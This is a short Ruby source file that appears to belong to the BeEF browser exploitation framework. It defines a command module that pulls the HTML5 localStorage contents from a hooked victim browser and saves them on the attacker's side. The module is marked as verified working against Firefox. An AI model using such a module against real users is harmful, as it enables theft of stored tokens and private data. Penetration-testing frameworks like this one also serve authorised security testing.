class Extract_local_storage < BeEF::Core::Command
  
  #
  # Defines and set up the command module.
  #
  # More info:
  #   http://dev.w3.org/html5/webstorage/
  #   http://diveintohtml5.org/storage.html
  #

  def initialize
    super({
      'Name' => 'Extract Local Storage',
      'Description' => 'Extracts data from the HTML5 localStorage object.',
      'Category' => 'Misc',
      'Author' => 'bcoles',
      'File' => __FILE__
    })
    
    set_target({
      'verified_status' => VERIFIED_WORKING,
      'browser_name' => FF
    })
 
    use_template!
  end
  
  def callback
    content = {}
    content['localStorage'] = @datastore['localStorage']
    save content
  end
  
end
